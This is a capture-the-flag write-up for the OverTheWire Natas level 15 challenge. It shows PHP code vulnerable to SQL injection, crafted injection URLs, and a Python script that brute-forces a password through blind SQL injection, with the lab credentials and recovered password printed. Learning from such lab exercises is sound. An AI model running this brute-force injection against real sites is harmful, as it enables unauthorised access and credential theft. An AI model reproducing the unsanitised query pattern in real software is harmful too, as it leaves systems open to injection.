Now it looks like we have a simply field to check whether or not a username exists in a database. Let's take a look at the code for this.

```php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
}
```
So it looks like the MySQL table is created with both the username and password having a limit of 32 characters. From immediate inspection, there doesn't appear to be a way directly evident in the code to find the password, as there was last time.

My initial thought was to try to do a simple injection the same as last time by setting username and password all in the username parameter for the query, like so: `http://natas15.natas.labs.overthewire.org/?debug&username=natas16%22%20and%20password=%221%27%20or%20%271%27%20=%20%221`, which results in `Executing query: SELECT * from users where username="natas16" and password="1' or '1' = "1"
Error in query.` No luck there.

Time to bruteforce it. After a bit of URL crafting, I came up with `?debug&username=natas16" and password LIKE BINARY "*LETTERS TO CHECK HERE*%`. Essentially, this will let me know one character at a time which characters of the password are correct. I tried finding a way to use curl to brute force this, but unfortunately I was encountering errors and just decided to stick with the easy option of Python.

In this folder is the python file I used, but for the sake of having it in this write-up, here's the code:
```python
import requests

CHARACTER_LIST = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
bf = ''

for i in range(1, 33):
    for char in CHARACTER_LIST:
        r = requests.get("http://natas15.natas.labs.overthewire.org/?debug&username=natas16%22%20and%20password%20LIKE%20BINARY%20%22" + bf + char + "%", auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if 'user exists' in r.text:
            bf = bf + char
            break
    print bf
```

The program basically just gets the password one character at a time until I have the full 32 character password.

Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
